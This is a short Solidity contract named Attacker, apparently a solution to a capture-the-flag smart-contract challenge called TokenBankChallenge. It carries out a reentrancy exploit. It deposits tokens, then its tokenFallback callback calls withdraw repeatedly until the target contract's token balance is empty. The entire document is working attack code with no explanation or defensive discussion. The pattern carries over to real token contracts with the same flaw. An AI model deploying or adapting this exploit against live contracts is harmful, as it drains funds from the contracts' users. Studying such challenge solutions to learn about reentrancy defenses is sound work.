
contract Attacker is ITokenReceiver {
    SimpleERC223Token token;
    TokenBankChallenge target;
    bool funded;
    
    function Attacker(address _tokenAddr, address _target) public {
        token = SimpleERC223Token(_tokenAddr);
        target = TokenBankChallenge(_target);
    }
    
    function attack() public {
        token.transfer(target, 500000 * 10**18);
        funded = true;
        target.withdraw(500000 * 10**18);
    }
    
    function tokenFallback(address from, uint256 value, bytes) external {
        if(funded == true) {
            while(token.balanceOf(target) > 0) { 
                target.withdraw(500000 * 10**18);
            }
        }
    }
}